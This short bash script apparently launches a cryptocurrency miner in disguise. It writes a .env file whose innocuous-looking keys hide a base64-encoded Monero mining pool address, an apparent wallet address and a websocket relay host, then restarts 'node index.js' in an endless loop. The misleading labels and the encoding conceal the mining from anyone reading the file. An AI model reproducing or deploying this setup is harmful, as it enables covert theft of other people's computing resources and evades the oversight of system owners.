#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=ws://cdn.apacer.web.id
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_DOMAIN=8AXJeWLKxZTR13AZ5yDFJEPgGg9Vk5fBCfYSomHNEswPYqui6ndNBbkgDwuDensqtGNTXdYuwqf6VTra4u3co7XQME1chiD
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
